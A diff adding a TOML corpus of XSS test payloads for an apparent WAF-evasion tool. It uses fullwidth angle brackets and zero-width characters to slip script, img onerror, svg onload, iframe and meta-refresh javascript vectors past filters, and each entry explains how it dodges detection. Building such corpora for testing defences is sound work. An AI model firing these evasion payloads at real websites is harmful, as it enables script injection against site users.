@@ -1,0 +1,79 @@
+schema = 1
+# Frontier 2026 XSS payloads exploiting the `bracket_confusable`
+# tamper (U+FF1C / U+FF1E fullwidth angle brackets) and the
+# `zero_width_inject` tamper applied to XSS context.
+#
+# These are the manual form of `wafrift evade --only
+# tamper/bracket_confusable --payload '<script>...'`.
+
+# ── Fullwidth bracket confusables ──
+
+[[case]]
+id = "bracket_fullwidth_script_tag"
+class = "xss"
+payload = "＜script＞alert(1)＜/script＞"
+description = "Fullwidth angle brackets U+FF1C / U+FF1E.  Browsers may normalize  in URL contexts; WAFs scanning for literal `<script>` miss."
+
+[[case]]
+id = "bracket_img_onerror_fullwidth"
+class = "xss"
+payload = "＜img src=x onerror=alert(1)＞"
+description = "Fullwidth img tag.  Round-trip through URL decoding may re-emit  normal ASCII in lenient app contexts."
+
+[[case]]
+id = "bracket_svg_handler_fullwidth"
+class = "xss"
+payload = "＜svg onload=alert(1)＞"
+description = "Fullwidth SVG.  Common XSS vector with the most-permissive  event-handler set; bracket substitution dodges literal scans."
+
+[[case]]
+id = "bracket_iframe_src_data"
+class = "xss"
+payload = "＜iframe src=data:text/html,＜script＞alert(1)＜/script＞＞＜/iframe＞"
+description = "Nested fullwidth bracket payload.  Tests data: URI handling plus  bracket normalization in the iframe-load path."
+
+[[case]]
+id = "bracket_meta_refresh"
+class = "xss"
+payload = "＜meta http-equiv=refresh content=0;url=javascript:alert(1)＞"
+description = "Meta-refresh-based XSS with fullwidth brackets.  Many CSP rules  miss this when the bracket class isn't normalized first."
+
+# ── Zero-width injection in XSS context ──
+
+[[case]]
+id = "zw_split_script_tag"
+class = "xss"
+payload = "<s​cript>alert(1)</s​cript>"
+description = "Zero-width space between `s` and `cript` in both tags.  Browsers  that strip zero-widths before tokenizing still match the tag;  WAFs scanning for `\\bscript\\b` regex miss."
+
+[[case]]
+id = "zw_split_onerror_handler"
+class = "xss"
+payload = "<img src=x oner‌ror=alert(1)>"
+description = "Zero-width non-joiner between `oner` and `ror`.  Bypasses  attribute-name pattern rules."
+
+[[case]]
+id = "zw_split_javascript_uri"
+class = "xss"
+payload = "<a href=javas​cript:alert(1)>x</a>"
+description = "Zero-width space inside the `javascript:` URI scheme.  Browsers  that strip zero-widths in URL parsing accept; WAFs scanning  for `\\bjavascript:` miss."
+
+[[case]]
+id = "zw_attribute_value_split"
+class = "xss"
+payload = "<svg/onload=al​ert(1)>"
+description = "Zero-width space in `alert(1)` function name.  Tests JavaScript  tokenizer behavior plus XSS bypass."
+
+# ── Bracket-confusable + zero-width composition ──
+
+[[case]]
+id = "combo_bracket_zw_script"
+class = "xss"
+payload = "＜s​cript＞alert(1)＜/s​cript＞"
+description = "Fullwidth brackets + zero-width split inside the tag name.   Double-bypass: literal `<script>` regex fails AND  Unicode-normalized `<script>` also fails."
+
+[[case]]
+id = "combo_zw_event_handler"
+class = "xss"
+payload = "<img/oner‍ror=al​ert(1) src=x>"
+description = "Zero-width joiner between `oner` and `ror`, zero-width space  inside `alert`.  Stress test for normalization-based defences."
